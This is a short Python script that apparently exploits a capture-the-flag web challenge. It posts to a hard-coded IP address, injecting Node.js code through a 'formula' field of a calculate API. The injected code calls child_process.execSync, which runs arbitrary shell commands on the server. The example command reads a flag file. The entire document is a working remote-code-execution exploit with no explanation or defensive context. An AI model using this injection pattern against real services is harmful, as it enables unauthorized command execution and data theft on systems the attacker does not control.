import httpx

URL = "http://83.136.253.251:42324"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.Client(base_url=url)
        
    def calculateRce(self,payload):
        return self.c.post("/api/calculate", json={
            "formula": f"require('child_process').execSync('{payload}').toString()",
        }).text
        
class API(BaseAPI):
    ...

if __name__ == "__main__":
    api = API()
    print(api.calculateRce("cat /fl*"))